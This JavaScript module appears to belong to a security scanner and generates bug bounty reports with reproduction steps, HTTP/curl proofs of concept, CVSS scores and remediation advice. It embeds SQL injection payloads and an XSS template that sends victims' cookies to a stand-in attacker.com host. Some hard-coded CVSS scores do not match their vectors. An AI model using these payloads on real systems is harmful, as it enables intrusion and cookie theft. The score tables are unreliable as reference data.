// Advanced Bug Bounty Reporting Service - Real HackerOne/Bugcrowd Style Reports
const PoCGenerator = require('../Phase3/pocGenerator');
const SeverityCalculator = require('../Phase3/severityCalculator');

class BugBountyReportService {
  /**
   * Generate HackerOne/Bugcrowd style report (Professional Bug Bounty Format)
   */
  static generateBugBountyReport(vulnerability, options = {}) {
    const report = {
      // Title (Clear, Concise, Impact-focused)
      title: this._generateTitle(vulnerability),
      
      // Summary (What, Where, Impact)
      summary: this._generateSummary(vulnerability),
      
      // Severity Assessment
      severity: this._calculateSeverity(vulnerability),
      
      // Vulnerability Details
      vulnerability_type: vulnerability.type,
      affected_asset: vulnerability.endpoint,
      parameter: vulnerability.parameter,
      
      // Steps to Reproduce (Critical for acceptance)
      steps_to_reproduce: this._generateStepsToReproduce(vulnerability),
      
      // Proof of Concept (Requests/Responses)
      proof_of_concept: this._generateDetailedPoC(vulnerability),
      
      // Impact Analysis (Business Impact)
      impact: this._generateImpactAnalysis(vulnerability),
      
      // Remediation (How to fix)
      remediation: this._generateRemediation(vulnerability),
      
      // Supporting Evidence
      evidence: this._generateEvidence(vulnerability),
      
      // CVSS Score (Industry standard)
      cvss: this._generateCVSS(vulnerability),
      
      // References
      references: this._generateReferences(vulnerability),
      
      // Timeline
      timeline: {
        discovered: vulnerability.discoveredAt || new Date().toISOString(),
        reported: new Date().toISOString()
      }
    };
    
    return report;
  }

  /**
   * Generate clear, impact-focused title (HackerOne best practice)
   */
  static _generateTitle(vuln) {
    const titles = {
      'SQL Injection':                 `SQL Injection in ${vuln.parameter} parameter allows database access`,
      'SQLi':                          `SQL Injection in ${vuln.parameter} parameter allows database access`,
      'Auth Bypass':                   `Authentication Bypass via ${vuln.parameter} — login possible without credentials`,
      'Cross-Site Scripting (XSS)':   `Reflected XSS in ${vuln.parameter} parameter enables session hijacking`,
      'Reflected XSS':                `Reflected XSS in ${vuln.parameter} parameter enables session hijacking`,
      'SSRF':                         `Server-Side Request Forgery (SSRF) via ${vuln.parameter} allows internal network access`,
      'Open Redirect':                `Open Redirect via ${vuln.parameter} enables phishing and OAuth token theft`,
      'SSRF':                         `SSRF via ${vuln.parameter} allows cloud metadata access and internal service enumeration`,
      'Stored XSS':                   `Stored XSS via ${vuln.parameter} enables account takeover`,
      'RCE':                          `Remote Code Execution (RCE) via ${vuln.parameter} — full server compromise`,
      'Path Traversal':               `Path Traversal in ${vuln.parameter} exposes sensitive files`,
      'XXE':                          `XML External Entity (XXE) Injection allows file disclosure`,
      'LFI':                          `Local File Inclusion (LFI) in ${vuln.parameter} exposes system files`,
      'IDOR':                         `Insecure Direct Object Reference (IDOR) in ${vuln.parameter} allows unauthorized access`,
      'CSRF':                         `Cross-Site Request Forgery (CSRF) enables unauthorized actions`,
      'AuthBypass':                   `Authentication Bypass via ${vuln.parameter} parameter`,
      'Security Misconfiguration':    `Missing ${vuln.parameter} security header exposes users to attack`
    };
    return titles[vuln.type] || `${vuln.type} vulnerability in ${vuln.parameter} parameter`;
  }

  /**
   * Generate executive summary (What + Where + Impact)
   */
  static _generateSummary(vuln) {
    const summaries = {
      'SQLi': `A SQL Injection vulnerability exists in the "${vuln.parameter}" parameter at ${vuln.endpoint}. By injecting malicious SQL syntax, an attacker can manipulate database queries, potentially leading to unauthorized data access, modification, or deletion.`,
      
      'Error-based SQLi': `An Error-based SQL Injection vulnerability was discovered in the "${vuln.parameter}" parameter. The application returns verbose SQL error messages that reveal database structure and enable systematic data extraction.`,
      
      'Blind SQLi (Boolean-based)': `A Boolean-based Blind SQL Injection vulnerability allows attackers to infer database content by observing different application responses to TRUE and FALSE SQL conditions. This enables systematic data extraction without direct error messages.`,
      
      'Time-based Blind SQLi': `A Time-based Blind SQL Injection vulnerability was identified where injected SLEEP() commands cause measurable delays in server responses. This confirms SQL injection and enables data extraction through timing analysis.`,
      
      'UNION-based SQLi': `A UNION-based SQL Injection vulnerability allows attackers to append additional SELECT statements to existing queries. This enables complete database enumeration and data exfiltration.`,
      
      'Reflected XSS': `A Reflected Cross-Site Scripting (XSS) vulnerability exists where user input in the "${vuln.parameter}" parameter is reflected in the HTML response without proper sanitization. This allows execution of arbitrary JavaScript in the context of victim browsers.`,
      
      'SSRF': `A Server-Side Request Forgery (SSRF) vulnerability in the "${vuln.parameter}" parameter allows attackers to make the server perform HTTP requests to arbitrary internal or external systems, potentially accessing internal services and cloud metadata.`,
      
      'RCE': `A Remote Code Execution (RCE) vulnerability enables attackers to execute arbitrary system commands on the server through the "${vuln.parameter}" parameter, leading to complete server compromise.`,
      
      'Path Traversal': `A Path Traversal vulnerability in the "${vuln.parameter}" parameter allows attackers to access files outside the intended directory structure, potentially exposing sensitive configuration files, source code, and credentials.`,
      
      'XXE': `An XML External Entity (XXE) Injection vulnerability allows attackers to read local files, perform SSRF attacks, and potentially achieve remote code execution through specially crafted XML payloads.`,
      
      'LFI': `A Local File Inclusion (LFI) vulnerability in the "${vuln.parameter}" parameter enables attackers to include and potentially execute local files, leading to information disclosure and possible remote code execution.`
    };
    
    return summaries[vuln.type] || `A ${vuln.type} vulnerability was discovered in the "${vuln.parameter}" parameter at ${vuln.endpoint}.`;
  }

  /**
   * Generate detailed steps to reproduce (Critical for bug bounty acceptance)
   */
  static _generateStepsToReproduce(vuln) {
    const baseSteps = [
      `1. Navigate to: ${vuln.endpoint}`,
      `2. Locate the "${vuln.parameter}" parameter`,
      `3. Inject the following payload: \`${vuln.payload}\``,
      `4. Observe the response`
    ];
    
    // Add vulnerability-specific steps
    const specificSteps = {
      'SQLi': [
        ...baseSteps,
        `5. Notice SQL error messages or unexpected behavior`,
        `6. Confirm database interaction by testing TRUE/FALSE conditions`,
        `7. Exploit using UNION SELECT or other SQLi techniques`
      ],
      
      'Error-based SQLi': [
        ...baseSteps,
        `5. Observe verbose SQL error message in response`,
        `6. Note database type and version information disclosed`,
        `7. Use error-based techniques to extract sensitive data`
      ],
      
      'Blind SQLi (Boolean-based)': [
        `1. Navigate to: ${vuln.endpoint}`,
        `2. Test TRUE condition: ${vuln.parameter}=1' AND '1'='1`,
        `3. Test FALSE condition: ${vuln.parameter}=1' AND '1'='2`,
        `4. Compare response lengths/content`,
        `5. Note significant difference indicating SQL injection`,
        `6. Use boolean-based extraction to retrieve data byte-by-byte`
      ],
      
      'Time-based Blind SQLi': [
        `1. Navigate to: ${vuln.endpoint}`,
        `2. Record baseline response time`,
        `3. Inject payload: ${vuln.parameter}=1' AND SLEEP(5)--`,
        `4. Observe 5+ second delay in response`,
        `5. Confirm with multiple tests`,
        `6. Use time-based extraction techniques`
      ],
      
      'Reflected XSS': [
        `1. Navigate to: ${vuln.endpoint}`,
        `2. Submit test payload in "${vuln.parameter}" parameter: ${vuln.payload}`,
        `3. Observe payload reflected unencoded in HTML response`,
        `4. Verify JavaScript execution with: <script>alert(document.domain)</script>`,
        `5. Confirm cookie access with: <script>alert(document.cookie)</script>`,
        `6. Craft phishing/session hijacking exploit`
      ],
      
      'UNION-based SQLi': [
        `1. Navigate to: ${vuln.endpoint}`,
        `2. Detect column count using ORDER BY`,
        `3. Test payload: ${vuln.parameter}=1' UNION SELECT NULL,NULL,NULL--`,
        `4. Identify vulnerable column positions`,
        `5. Extract data: 1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--`,
        `6. Dump sensitive data from identified tables`
      ]
    };
    
    return specificSteps[vuln.type] || baseSteps;
  }

  /**
   * Generate detailed PoC with HTTP requests/responses
   */
  static _generateDetailedPoC(vuln) {
    const poc = {
      // HTTP Request
      http_request: this._generateHTTPRequest(vuln),
      
      // curl command
      curl_command: this._generateCurlCommand(vuln),
      
      // Response snippet
      response_snippet: vuln.response?.snippet || 'See attached screenshot',
      
      // Visual proof
      screenshots: this._generateScreenshotPlaceholders(vuln),
      
      // Video PoC
      video_poc: `Consider recording a video demonstrating: ${vuln.type} exploitation`,
      
      // Code snippet
      exploit_code: this._generateExploitCode(vuln)
    };
    
    return poc;
  }

  /**
   * Generate HTTP request format
   */
  static _generateHTTPRequest(vuln) {
    const method = vuln.request?.method || 'GET';
    const url = new URL(vuln.endpoint);
    
    if (method === 'GET') {
      return `${method} ${url.pathname}?${vuln.parameter}=${encodeURIComponent(vuln.payload)} HTTP/1.1
Host: ${url.hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml,application/xml
Connection: close`;
    } else {
      return `${method} ${url.pathname} HTTP/1.1
Host: ${url.hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: ${vuln.parameter.length + vuln.payload.length + 1}

${vuln.parameter}=${encodeURIComponent(vuln.payload)}`;
    }
  }

  /**
   * Generate curl command
   */
  static _generateCurlCommand(vuln) {
    const method = vuln.request?.method || 'GET';
    const url = vuln.endpoint;
    
    if (method === 'GET') {
      const urlObj = new URL(url);
      urlObj.searchParams.set(vuln.parameter, vuln.payload);
      return `curl -X GET '${urlObj.toString()}' \\
  -H 'User-Agent: Mozilla/5.0' \\
  -H 'Accept: */*'`;
    } else {
      return `curl -X ${method} '${url}' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -H 'User-Agent: Mozilla/5.0' \\
  -d '${vuln.parameter}=${encodeURIComponent(vuln.payload)}'`;
    }
  }

  /**
   * Generate impact analysis (Business impact for triagers)
   */
  static _generateImpactAnalysis(vuln) {
    const impacts = {
      'SQLi': {
        confidentiality: 'HIGH - Complete database access',
        integrity: 'HIGH - Database modification possible',
        availability: 'MEDIUM - Database can be dropped',
        business_impact: [
          'Unauthorized access to all user data',
          'Exposure of passwords, emails, and PII',
          'Potential data breach and GDPR violations',
          'Database manipulation or deletion',
          'Reputational damage'
        ]
      },
      
      'Error-based SQLi': {
        confidentiality: 'HIGH - Database structure and data exposed',
        integrity: 'HIGH - Data modification possible',
        availability: 'MEDIUM - Database operations can be disrupted',
        business_impact: [
          'Database schema and version disclosure',
          'Systematic data extraction',
          'User credentials exposure',
          'Compliance violations (PCI-DSS, GDPR)',
          'Competitive intelligence leak'
        ]
      },
      
      'Blind SQLi (Boolean-based)': {
        confidentiality: 'HIGH - Complete data extraction possible',
        integrity: 'MEDIUM - Limited data modification',
        availability: 'LOW - Minimal disruption',
        business_impact: [
          'Slow but complete data exfiltration',
          'Automated extraction of sensitive data',
          'User account compromise',
          'Long-term undetected data theft'
        ]
      },
      
      'Time-based Blind SQLi': {
        confidentiality: 'HIGH - Complete data extraction via timing',
        integrity: 'LOW - Limited modification capability',
        availability: 'MEDIUM - Can cause performance degradation',
        business_impact: [
          'Systematic database enumeration',
          'User credential extraction',
          'Server resource exhaustion',
          'Long-term data breach'
        ]
      },
      
      'UNION-based SQLi': {
        confidentiality: 'CRITICAL - Complete database dump',
        integrity: 'HIGH - Full database control',
        availability: 'HIGH - Can drop tables',
        business_impact: [
          'Instant access to entire database',
          'Mass data exfiltration',
          'Critical infrastructure exposure',
          'Immediate data breach',
          'Severe regulatory penalties'
        ]
      },
      
      'Reflected XSS': {
        confidentiality: 'MEDIUM - Session hijacking possible',
        integrity: 'MEDIUM - Account manipulation',
        availability: 'LOW - Minimal disruption',
        business_impact: [
          'User session theft',
          'Phishing attacks',
          'Malware distribution',
          'Account takeover',
          'Credential harvesting'
        ]
      },
      
      'SSRF': {
        confidentiality: 'HIGH - Internal network access',
        integrity: 'MEDIUM - Internal system manipulation',
        availability: 'MEDIUM - Can attack internal services',
        business_impact: [
          'Internal network enumeration',
          'Cloud metadata access (AWS credentials)',
          'Internal service exploitation',
          'Lateral movement capability',
          'Infrastructure compromise'
        ]
      },
      
      'RCE': {
        confidentiality: 'CRITICAL - Complete server access',
        integrity: 'CRITICAL - Full system control',
        availability: 'CRITICAL - Can destroy server',
        business_impact: [
          'Complete server compromise',
          'Data destruction capability',
          'Ransomware deployment',
          'Backdoor installation',
          'Total business disruption',
          'Severe financial and reputational damage'
        ]
      }
    };
    
    return impacts[vuln.type] || {
      confidentiality: 'UNKNOWN',
      integrity: 'UNKNOWN',
      availability: 'UNKNOWN',
      business_impact: ['Requires further analysis']
    };
  }

  /**
   * Generate remediation advice (How to fix)
   */
  static _generateRemediation(vuln) {
    const remediations = {
      'SQLi': {
        immediate: [
          'Switch to parameterized queries (prepared statements)',
          'Use ORM frameworks with built-in protection',
          'Deploy a Web Application Firewall (WAF) as temporary mitigation'
        ],
        long_term: [
          'Code review all database interactions',
          'Implement input validation with whitelist approach',
          'Use least-privilege database accounts',
          'Enable database query logging and monitoring',
          'Conduct regular security testing'
        ],
        code_example: `// VULNERABLE CODE:
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// SECURE CODE:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);`
      },
      
      'Reflected XSS': {
        immediate: [
          'HTML encode all user input before output',
          'Implement Content Security Policy (CSP) headers',
          'Enable XSS protection headers'
        ],
        long_term: [
          'Use auto-escaping template engines',
          'Implement context-aware output encoding',
          'Adopt secure development framework',
          'Regular code audits for XSS',
          'Security training for developers'
        ],
        code_example: `// VULNERABLE CODE:
echo "<div>" . $_GET['search'] . "</div>";

// SECURE CODE:
echo "<div>" . htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8') . "</div>";`
      },
      
      'SSRF': {
        immediate: [
          'Validate and whitelist allowed URLs/domains',
          'Block access to internal IP ranges (RFC 1918)',
          'Remove user control of destination URLs'
        ],
        long_term: [
          'Implement URL parsing and validation library',
          'Use separate network segments for user-facing services',
          'Monitor outbound connections',
          'Disable unnecessary URL schemes (file://, gopher://)',
          'Implement defense-in-depth architecture'
        ],
        code_example: `// VULNERABLE CODE:
$url = $_GET['url'];
$content = file_get_contents($url);

// SECURE CODE:
$allowed_domains = ['example.com', 'trusted.com'];
$url = $_GET['url'];
$host = parse_url($url, PHP_URL_HOST);
if (!in_array($host, $allowed_domains)) {
    die('Invalid URL');
}
$content = file_get_contents($url);`
      }
    };
    
    return remediations[vuln.type] || {
      immediate: ['Implement input validation', 'Add security controls'],
      long_term: ['Conduct code review', 'Implement secure coding practices']
    };
  }

  /**
   * Generate supporting evidence
   */
  static _generateEvidence(vuln) {
    return {
      indicators: vuln.indicators || [],
      confidence: `${vuln.confidence || 0}%`,
      exploitation_method: vuln.exploitationMethod || 'Manual testing',
      detection_context: vuln.context || 'N/A',
      response_analysis: vuln.response?.snippet?.substring(0, 200) || 'N/A'
    };
  }

  /**
   * Calculate CVSS score (Industry standard)
   */
  static _generateCVSS(vuln) {
    // CVSS 3.1 vectors by vulnerability type
    const vectors = {
      'SQL Injection':                    'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
      'SQLi':                             'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
      'Cross-Site Scripting (XSS)':       'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
      'Reflected XSS':                    'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
      'SSRF':                             'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L',
      'RCE':                              'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
      'Path Traversal':                   'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
      'Security Misconfiguration':        'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
    };

    // CVSS 3.1 base scores — accurate per type
    const scores = {
      'SQL Injection':                    9.8,
      'SQLi':                             9.8,
      'Error-based SQLi':                 9.8,
      'Blind SQLi (Boolean-based)':       9.1,
      'Time-based Blind SQLi':            8.6,
      'UNION-based SQLi':                 10.0,
      'Auth Bypass':                      9.5,
      'Cross-Site Scripting (XSS)':       6.1,
      'Reflected XSS':                    6.1,
      'Stored XSS':                       9.0,
      'SSRF':                             8.6,
      'RCE':                              10.0,
      'Path Traversal':                   7.5,
      'XXE':                              8.2,
      'LFI':                              7.5,
      'IDOR':                             7.5,
      'CSRF':                             6.5,
      'Open Redirect':                    6.1,
      'Security Misconfiguration':        null  // Calculated per header below
    };

    // For Security Misconfiguration, score depends on WHICH header is missing
    if (vuln.type === 'Security Misconfiguration') {
      const headerScores = {
        'strict-transport-security':  7.5,  // High — no HTTPS enforcement
        'content-security-policy':    7.5,  // High — no XSS mitigation
        'x-frame-options':            6.1,  // Medium — clickjacking risk
        'x-content-type-options':     4.3,  // Medium — MIME sniffing risk
        'x-xss-protection':           4.3,  // Medium — legacy protection missing
        'referrer-policy':            3.1,  // Low — info leak
        'permissions-policy':         3.1,  // Low
      };
      const headerName = (vuln.parameter || '').toLowerCase();
      const headerScore = headerScores[headerName] || 4.3;
      return {
        vector: vectors['Security Misconfiguration'],
        score: headerScore,
        severity: this._cvssScoreToSeverity(headerScore)
      };
    }

    const score = scores[vuln.type] ?? 5.0;
    return {
      vector: vectors[vuln.type] || 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N',
      score,
      severity: this._cvssScoreToSeverity(score)
    };
  }

  /**
   * Generate references
   */
  static _generateReferences(vuln) {
    const references = {
      'SQLi': [
        'https://owasp.org/www-community/attacks/SQL_Injection',
        'https://portswigger.net/web-security/sql-injection',
        'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
        'CWE-89: SQL Injection'
      ],
      'Reflected XSS': [
        'https://owasp.org/www-community/attacks/xss/',
        'https://portswigger.net/web-security/cross-site-scripting',
        'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
        'CWE-79: Cross-site Scripting'
      ],
      'SSRF': [
        'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
        'https://portswigger.net/web-security/ssrf',
        'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
        'CWE-918: Server-Side Request Forgery'
      ],
      'RCE': [
        'https://owasp.org/www-community/attacks/Command_Injection',
        'https://portswigger.net/web-security/os-command-injection',
        'CWE-78: OS Command Injection',
        'CWE-94: Code Injection'
      ]
    };
    
    return references[vuln.type] || [
      'https://owasp.org/www-project-top-ten/',
      'https://portswigger.net/web-security/all-topics'
    ];
  }

  /**
   * Generate exploit code (for PoC)
   */
  static _generateExploitCode(vuln) {
    const exploits = {
      'SQLi': `# Python SQLi Exploit
import requests

url = "${vuln.endpoint}"
payload = "${vuln.payload}"
params = {"${vuln.parameter}": payload}

response = requests.get(url, params=params)
print(response.text)`,
      
      'Reflected XSS': `<!-- HTML PoC for XSS -->
<html>
<body>
<script>
  // Redirect victim to attacker-controlled site with cookies
  window.location = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
</body>
</html>`
    };
    
    return exploits[vuln.type] || `# Exploit code for ${vuln.type}`;
  }

  /**
   * Generate screenshot placeholders
   */
  static _generateScreenshotPlaceholders(vuln) {
    return [
      'Screenshot 1: Vulnerable parameter identified',
      'Screenshot 2: Payload injection',
      'Screenshot 3: Vulnerable response',
      'Screenshot 4: Exploitation success'
    ];
  }

  /**
   * CVSS score to severity
   */
  static _cvssScoreToSeverity(score) {
    if (score >= 9.0) return 'CRITICAL';
    if (score >= 7.0) return 'HIGH';
    if (score >= 4.0) return 'MEDIUM';
    if (score >= 0.1) return 'LOW';
    return 'NONE';
  }

  /**
   * Calculate severity
   */
  static _calculateSeverity(vuln) {
    return SeverityCalculator.calculateSimpleSeverity(vuln);
  }

  /**
   * Generate Markdown report (for HackerOne/Bugcrowd submission)
   */
  static generateMarkdownReport(vulnerability) {
    const report = this.generateBugBountyReport(vulnerability);
    
    return `# ${report.title}

## Summary
${report.summary}

## Severity
**CVSS Score:** ${report.cvss.score}/10 (${report.cvss.severity})  
**Vector:** \`${report.cvss.vector}\`

## Vulnerability Details
- **Type:** ${report.vulnerability_type}
- **Affected Asset:** ${report.affected_asset}
- **Parameter:** ${report.parameter}
- **Confidence:** ${report.evidence.confidence}

## Steps to Reproduce
${report.steps_to_reproduce.map(step => step).join('\n')}

## Proof of Concept

### HTTP Request
\`\`\`http
${report.proof_of_concept.http_request}
\`\`\`

### cURL Command
\`\`\`bash
${report.proof_of_concept.curl_command}
\`\`\`

### Response
\`\`\`
${report.proof_of_concept.response_snippet}
\`\`\`

## Impact
${report.impact.business_impact.map(impact => `- ${impact}`).join('\n')}

**CIA Triad:**
- Confidentiality: ${report.impact.confidentiality}
- Integrity: ${report.impact.integrity}
- Availability: ${report.impact.availability}

## Remediation

### Immediate Actions
${report.remediation.immediate.map(action => `- ${action}`).join('\n')}

### Long-term Solutions
${report.remediation.long_term.map(action => `- ${action}`).join('\n')}

### Code Example
\`\`\`
${report.remediation.code_example || 'N/A'}
\`\`\`

## References
${report.references.map(ref => `- ${ref}`).join('\n')}

## Timeline
- **Discovered:** ${new Date(report.timeline.discovered).toLocaleString()}
- **Reported:** ${new Date(report.timeline.reported).toLocaleString()}

---
*This report was generated by ZerOn Security Scanner*
`;
  }
}

module.exports = BugBountyReportService;
